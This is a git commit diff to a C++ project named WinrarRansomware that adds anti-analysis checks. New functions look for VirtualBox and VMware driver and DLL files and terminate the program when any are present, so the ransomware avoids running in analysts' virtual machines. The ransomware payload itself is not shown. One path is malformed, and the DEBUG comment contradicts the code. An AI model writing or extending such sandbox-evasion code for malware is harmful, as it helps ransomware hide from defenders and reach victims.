ff9c411f9dab00154ab9ae0d6696997dea5da976
kuqadk3 <kuqadk3@gmail.com>
2017-03-01 14:01:22 +0700

    Anti Vmware and Anti VirtualBox

--- WinrarRansomware/main.cpp
+++ WinrarRansomware/main.cpp
@@ -9,10 +9,19 @@
 #include <stdlib.h>		/* for Exit() */
 using namespace std;
 
+#define DEBUG 1 //debug 1 - turn off,0 - turn on
+
 bool fileExists(const std::string& filename);
 std::string generateKey();
+void antiVmware();
+void antiVirtualBox();
 
 int main(){
+
+	if(DEBUG == 1){
+	antiVmware();
+	antiVirtualBox();
+}
 //----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 	TCHAR filePath[MAX_PATH];
 	TCHAR tempPath[MAX_PATH];
@@ -92,6 +101,61 @@ int main(){
 
 
 //----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+void antiVirtualBox(){
+	if(fileExists("C:\\windows\\System32\\Drivers\\VBoxMouse.sys")){
+		exit(EXIT_FAILURE);
+	}
+	else if(fileExists("C:\\windows\\System32\\Drivers\\VBoxGuest.sys")) exit(EXIT_FAILURE);
+	else if(fileExists("C:\\windows\\System32\\Drivers\\VBoxSF.sys")) exit(EXIT_FAILURE);
+	else if(fileExists("C:\\windows\\System32\\Drivers\\VBoxVideo.sys")) exit(EXIT_FAILURE);
+	else if(fileExists("C:\\windows\\System32\\vboxdisp.dll")) exit(EXIT_FAILURE);
+	else if(fileExists("C:\\windows\\System32\\vboxhook.dll")) exit(EXIT_FAILURE);
+	else if(fileExists("C:\\windows\\System32\\vboxmrxnp.dll")) exit(EXIT_FAILURE);
+	else if(fileExists("C:\\windows\\System32\\vboxogl.dll")) exit(EXIT_FAILURE);
+	else if(fileExists("C:\\windows\\System32\\vboxoglarrayspu.dll")) exit(EXIT_FAILURE);
+	else if(fileExists("C:\\windows\\System32\\vboxoglcrutil.dll")) exit(EXIT_FAILURE);
+	else if(fileExists("C:\\windows\\System32\\vboxoglerrorspu.dll")) exit(EXIT_FAILURE);
+	else if(fileExists("C:\\windows\\System32\\vboxoglfeedbackspu.dll")) exit(EXIT_FAILURE);
+	else if(fileExists("C:\\windows\\System32\\vboxoglpackspu.dll")) exit(EXIT_FAILURE);
+	else if(fileExists("C:\\windows\\System32\\vboxoglpassthroughspu.dll")) exit(EXIT_FAILURE);
+
+}
+
+void antiVmware(){
+	if(fileExists("C:\\windows\\System32\\Drivers\\Vmmouse.sys")){
+		exit(EXIT_FAILURE);
+	}
+	else if(fileExists("C:\\windows\\System32\\Drivers\\vm3dgl.dll")){
+		exit(EXIT_FAILURE);
+	}
+	else if(fileExists("C:\\windows\\System32\\Drivers\\vmdum.dll")){
+		exit(EXIT_FAILURE);
+	}
+	else if(fileExists("C:\\windows\\System32\\Drivers\\vm3dver.dll")){
+		exit(EXIT_FAILURE);
+	}
+	else if(fileExists("C:\\windows\\System32\\Drivers\\vmtray.dll")){
+		exit(EXIT_FAILURE);
+	}
+	else if(fileExists("C:\\windows\\System32\\Drivers\\VMToolsHook.dll")){
+		exit(EXIT_FAILURE);
+	}
+	else if(fileExists("C:\\windows\\System32\\Drivers\\vmmousever.dll")){
+		exit(EXIT_FAILURE);
+	}
+	else if(fileExists("C:\\windows\\System32\\Drivers\\vmhgfs.dll")){
+		exit(EXIT_FAILURE);
+	}
+	else if(fileExists("C:\\windows\\System32\\Drivers\\vmGuestLib.dll")){
+		exit(EXIT_FAILURE);
+	}
+	else if(fileExists("C:\\windows\\System32\\Drivers\\VmGuestLibJava.dll")){
+		exit(EXIT_FAILURE);
+	}
+	else if(fileExists("C:\\windows\\System32\\Driversvmhgfs.dll")){
+		exit(EXIT_FAILURE);
+	}
+}
 bool fileExists(const std::string& filename)
 {
 	struct stat buf;
